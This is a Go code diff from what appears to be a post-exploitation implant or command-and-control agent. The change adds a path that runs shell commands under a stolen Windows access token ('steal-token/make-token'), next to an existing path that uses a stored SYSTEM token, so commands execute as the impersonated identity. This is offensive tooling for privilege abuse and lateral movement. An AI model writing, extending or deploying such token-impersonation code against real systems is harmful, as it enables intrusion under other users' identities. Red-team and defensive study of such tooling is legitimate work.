@@ -95,15 +95,22 @@ func shellDirect(cmd string) string {
 }
 
 // runShellSystemHook runs cmd using temp-file redirection on Windows, optionally
-// via the stored SYSTEM token. Using temp files instead of pipes avoids handle
-// inheritance into grandchild processes (e.g. 'start /b agent.exe').
+// via the stored SYSTEM or stolen token. Using temp files instead of pipes avoids
+// handle inheritance into grandchild processes (e.g. 'start /b agent.exe').
 func runShellSystemHook(cmd string) (out string, handled bool, err error) {
 	if gSystemToken != 0 {
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
 		return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
 	}
-	// Non-SYSTEM case: always use temp-file approach on Windows to avoid
+	// When steal-token/make-token is active, use CreateProcessWithTokenW so the
+	// child process runs under the stolen identity (not the process primary token).
+	if stolenToken != 0 {
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
+		return shellDirectAsSystem(cmd, windows.Handle(stolenToken)), true, nil
+	}
+	// Non-elevated case: always use temp-file approach on Windows to avoid
 	// pipe handle inheritance into background processes.
 	return shellDirect(cmd), true, nil
 }
